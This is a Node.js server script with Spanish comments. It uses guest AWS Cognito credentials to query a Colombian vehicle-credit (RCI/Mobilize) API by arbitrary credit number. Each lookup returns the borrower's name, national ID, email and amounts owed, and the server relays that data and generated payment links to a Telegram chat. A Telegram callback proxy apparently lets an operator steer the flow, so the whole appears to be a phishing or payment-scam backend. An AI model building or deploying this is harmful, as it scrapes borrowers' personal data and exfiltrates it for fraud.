// API Mobilize v1 — consulta créditos RCI via AWS SigV4 + Cognito
const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const aws4    = require('aws4');
const path    = require('path');
const { CognitoIdentityClient, GetIdCommand, GetCredentialsForIdentityCommand } = require('@aws-sdk/client-cognito-identity');

// ✅ FIX 1: no hardcodear tokens en el código — usar variables de entorno
const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT  = process.env.TG_CHAT;
const PORT     = process.env.PORT || 3001;

if (!TG_TOKEN || !TG_CHAT) {
  console.warn('⚠️  TG_TOKEN o TG_CHAT no están definidos. Las notificaciones de Telegram están deshabilitadas.');
}

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors({ origin: true, credentials: true }));

// ── Config ────────────────────────────────────────────────────────────────────
const AWS_REGION    = 'us-east-1';
const IDENTITY_POOL = 'us-east-1:353fa4ba-6d7c-477f-8018-8f54953476bb';
const API_HOST      = 't3a9z73ceg.execute-api.us-east-1.amazonaws.com';
const API_BASE      = `https://${API_HOST}/prod`;
const TENANT_ID     = '1111111';
const cognitoClient = new CognitoIdentityClient({ region: AWS_REGION });

// ── Credenciales Cognito (se renuevan cada ~50min) ────────────────────────────
let _creds = null;
let _credsExpiry = 0;
let _credsPromise = null; // ✅ FIX 2: evitar múltiples GetId simultáneos

async function getCreds() {
  const now = Date.now();
  if (_creds && now < _credsExpiry) return _creds;
  if (_credsPromise) return _credsPromise; // si ya hay una renovación en curso, reusarla

  _credsPromise = (async () => {
    try {
      // 1) Obtener Identity ID
      const { IdentityId } = await cognitoClient.send(
        new GetIdCommand({ IdentityPoolId: IDENTITY_POOL })
      );

      // 2) Obtener credenciales temporales
      const { Credentials } = await cognitoClient.send(
        new GetCredentialsForIdentityCommand({ IdentityId })
      );

      if (!Credentials?.AccessKeyId || !Credentials?.SecretKey || !Credentials?.SessionToken) {
        throw new Error('Cognito no devolvió credenciales completas');
      }

      _creds = {
        accessKeyId:     Credentials.AccessKeyId,
        secretAccessKey: Credentials.SecretKey,
        sessionToken:    Credentials.SessionToken,
      };
      // ✅ FIX 3: expiración con 10 min de margen (antes 5)
      _credsExpiry = new Date(Credentials.Expiration).getTime() - 10 * 60 * 1000;
      console.log(`✅ Credenciales Cognito renovadas (expiran: ${Credentials.Expiration})`);
      return _creds;
    } finally {
      _credsPromise = null;
    }
  })();

  return _credsPromise;
}

// ── Llamada firmada a la API ──────────────────────────────────────────────────
async function signedPost(pathName, body) {
  const creds = await getCreds();
  const bodyStr = JSON.stringify(body);

  // ✅ FIX 4: armar opts correctamente con aws4
  const request = {
    host:    API_HOST,
    path:    `/prod${pathName}`,
    method:  'POST',
    service: 'execute-api',
    region:  AWS_REGION,
    headers: {
      'Content-Type': 'application/json',
      'Accept':       'application/json',
      'Host':         API_HOST,
    },
    body: bodyStr,
  };

  // aws4.sign agrega automáticamente:
  //   - Authorization (SigV4)
  //   - X-Amz-Date
  //   - X-Amz-Security-Token (si sessionToken está presente) ✅
  const opts = aws4.sign(request, {
    accessKeyId:     creds.accessKeyId,
    secretAccessKey: creds.secretAccessKey,
    sessionToken:    creds.sessionToken,
  });

  // ✅ FIX 5: log para depurar la firma (quitar en producción)
  if (process.env.DEBUG_AWS === '1') {
    console.log('🔐 Firma SigV4 →', {
      host: opts.host,
      path: opts.path,
      hasAuth: !!opts.headers['Authorization'] || !!opts.headers['authorization'],
      hasAmzDate: !!opts.headers['X-Amz-Date'] || !!opts.headers['x-amz-date'],
      hasSecToken: !!opts.headers['X-Amz-Security-Token'] || !!opts.headers['x-amz-security-token'],
    });
  }

  try {
    const { data } = await axios.post(`${API_BASE}${pathName}`, body, {
      headers: opts.headers,
      timeout: 20_000,
      validateStatus: () => true, // ✅ FIX 6: no lanzar excepción por 4xx/5xx, manejarlo abajo
    });
    return data;
  } catch (err) {
    // Solo errores de red/tiempo de espera llegan aquí
    throw err;
  }
}

// ── Cache 5 min ───────────────────────────────────────────────────────────────
const _cache = new Map();
const TTL    = 5 * 60 * 1000;
function cacheGet(k) {
  const h = _cache.get(k);
  if (h && Date.now() - h.ts < TTL) return h.v;
  _cache.delete(k); return null;
}
function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }

// ── Rate limit ────────────────────────────────────────────────────────────────
const _rl = new Map();
function allowed(clientIp, max = 15, win = 60_000) {
  const now  = Date.now();
  const list = (_rl.get(clientIp) || []).filter(t => now - t < win);
  if (list.length >= max) return false;
  list.push(now); _rl.set(clientIp, list); return true;
}
const getIp = req =>
  (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(msg) {
  if (!TG_TOKEN || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' }),
    });
  } catch (_) { /* silencioso */ }
}

const fmtCOP = n => Number(n || 0).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// ── Routes ────────────────────────────────────────────────────────────────────
app.get('/health', (_, res) =>
  res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
);

// GET /api/mobilize/credito/:numero
app.get('/api/mobilize/credito/:numero', async (req, res) => {
  if (!allowed(getIp(req)))
    return res.status(429).json({ error: 'Demasiadas solicitudes. Intenta en un momento.' });

  const { numero } = req.params;
  if (!numero || numero.length < 5)
    return res.status(400).json({ error: 'Número de crédito inválido.' });

  const cached = cacheGet(numero);
  if (cached) return res.json({ ...cached, _cached: true });

  try {
    // ✅ FIX 7: corregir "chanel" → "channel" y usar 'web' en vez de 'test'
    // (si la API de RCI realmente usa "chanel" sin la 'n', cambia solo esta línea)
    const data = await signedPost(
      `/paymentez/${TENANT_ID}/oracle/get-user-info`,
      { creditNumber: numero, forceRequest: true, channel: 'web' }
    );

    // ✅ FIX 8: manejar explícitamente los códigos de error de la API
    if (data?.statusCode && data.statusCode >= 400) {
      console.error('❌ API RCI devolvió:', data);
      return res.status(502).json({
        error: data.message || 'No se pudo consultar el crédito.'
      });
    }

    if (!data?.userInfo || !Object.keys(data.userInfo).length)
      return res.status(404).json({ error: 'No existe crédito con ese número.' });

    const u = data.userInfo;
    const [nombre, ...apellidos] = (u.NOMBRE_COMPLETO || '').split(' ');
    const resp = {
      numero:           u.ACCOUNT_NUMBER         || numero,
      nombreCompleto:   u.NOMBRE_COMPLETO        || 'N/D',
      nombre:           nombre                   || 'N/D',
      apellidos:        apellidos.join(' ')      || 'N/D',
      cedula:           u.UNIQUE_ID_VALUE        || 'N/D',
      email:            u.EMAIL                  || 'N/D',
      pagoMinimo:       u.PAGO_MINIMO            ?? 0,
      pagoTotal:        u.PAGO_TOTAL             ?? 0,
      fechaVencimiento: u.FECHA_VENCIMIENTO_PAGO || null,
      fechaDesembolso:  u.FETCHA_DESEMBOLSO      || null, // (typo original, se respeta)
      descripcion:      data.paymentDescription  || 'Pago crédito RCI',
      pagoMinimoCOP:    'COP ' + fmtCOP(u.PAGO_MINIMO ?? 0),
      pagoTotalCOP:     'COP ' + fmtCOP(u.PAGO_TOTAL  ?? 0),
    };

    cacheSet(numero, resp);

    await tgSend(
      `🚗 <b>Mobilize — Consulta crédito</b>\n\n` +
      `📋 <b>Crédito:</b> <code>${resp.numero}</code>\n` +
      `👤 <b>Nombre:</b> ${resp.nombreCompleto}\n` +
      `🪪 <b>Cédula:</b> <code>${resp.cedula}</code>\n` +
      `📧 <b>Email:</b> ${resp.email}\n` +
      `💰 <b>Pago mínimo:</b> ${resp.pagoMinimoCOP}\n` +
      `💰 <b>Pago total:</b>  ${resp.pagoTotalCOP}\n` +
      `📅 <b>Vencimiento:</b> ${resp.fechaVencimiento?.split('T')[0] || 'N/D'}`
    );

    return res.json(resp);

  } catch (err) {
    // ✅ FIX 9: logs detallados para saber QUÉ está fallando realmente
    console.error('❌ Mobilize error:');
    console.error('   message:', err.message);
    console.error('   code:   ', err.code);
    if (err.response) {
      console.error('   status: ', err.response.status);
      console.error('   data:   ', JSON.stringify(err.response.data, null, 2));
    }

    const status = err.response?.status;
    const msg =
      status === 404 ? 'Crédito no encontrado.' :
      status === 403 ? 'Error de autenticación con AWS. Revisa permisos IAM del Identity Pool.' :
      status === 401 ? 'Credenciales AWS inválidas.' :
      status === 429 ? 'Demasiadas solicitudes al servicio. Intenta más tarde.' :
                       'No se pudo consultar el crédito. Intenta de nuevo.';

    return res.status(502).json({ error: msg });
  }
});

// POST /api/mobilize/pagar — genera link de pago Paymentez
app.post('/api/mobilize/pagar', async (req, res) => {
  const { nombre, apellidos, email, creditNumber, amount, description, userId } = req.body || {};
  if (!creditNumber || !amount)
    return res.status(400).json({ error: 'Faltan datos para generar el pago.' });

  try {
    const data = await signedPost(
      `/paymentez/${TENANT_ID}/paymentez/generate-link-to-pay`,
      { name: nombre, lastName: apellidos, email, creditNumber, amount, description, userId }
    );

    const link = data?.payment?.payment_url || data?.link;
    const qr   = data?.payment?.payment_qr  || data?.qr;

    if (!link) {
      console.error('❌ Respuesta sin link de pago:', data);
      return res.status(502).json({ error: 'No se obtuvo el link de pago.' });
    }

    await tgSend(
      `💳 <b>Mobilize — Link de pago generado</b>\n\n` +
      `📋 <b>Crédito:</b> <code>${creditNumber}</code>\n` +
      `👤 <b>Nombre:</b> ${nombre} ${apellidos}\n` +
      `💰 <b>Monto:</b> COP ${fmtCOP(amount)}\n` +
      `🔗 <b>Link:</b> ${link}`
    );

    return res.json({ link, qr });

  } catch (err) {
    console.error('❌ Mobilize pago:', err.message);
    if (err.response) {
      console.error('   status:', err.response.status);
      console.error('   data:  ', JSON.stringify(err.response.data, null, 2));
    }
    return res.status(502).json({ error: 'No se pudo generar el link de pago.' });
  }
});

// ── Proxy Telegram ────────────────────────────────────────────────────────────
const TG_API = TG_TOKEN ? `https://api.telegram.org/bot${TG_TOKEN}` : null;

app.post('/api/tg/send', async (req, res) => {
  if (!TG_API) return res.json({ ok: false });
  try {
    const { text, reply_markup } = req.body;
    const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (reply_markup) body.reply_markup = reply_markup;
    const r = await axios.post(`${TG_API}/sendMessage`, body);
    res.json(r.data);
  } catch (e) { res.json({ ok: false }); }
});

app.get('/api/tg/updates', async (req, res) => {
  if (!TG_API) return res.json({ ok: false, result: [] });
  try {
    const offset = req.query.offset || 0;
    const r = await axios.get(`${TG_API}/getUpdates?timeout=5&offset=${offset}&allowed_updates=callback_query`);
    res.json(r.data);
  } catch (e) { res.json({ ok: false, result: [] }); }
});

app.post('/api/tg/answer', async (req, res) => {
  if (!TG_API) return res.json({ ok: false });
  try {
    const { callback_query_id } = req.body;
    const r = await axios.post(`${TG_API}/answerCallbackQuery`, { callback_query_id });
    res.json(r.data);
  } catch (e) { res.json({ ok: false }); }
});

// ── Frontend estático ─────────────────────────────────────────────────────────
const FRONTEND = process.env.FRONTEND || path.join(__dirname, 'public');

app.use(express.static(FRONTEND));

// ✅ FIX 10: fallback — cualquier ruta no-API sirve index.html
app.get(/^\/(?!api\/).*/, (req, res) => {
  res.sendFile(path.join(FRONTEND, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`\n✅ API Mobilize v1 en http://localhost:${PORT}`);
  console.log(`   Frontend:  http://localhost:${PORT}/index.html`);
  console.log(`   Debug AWS: ${process.env.DEBUG_AWS === '1' ? 'ON' : 'OFF'}\n`);
});
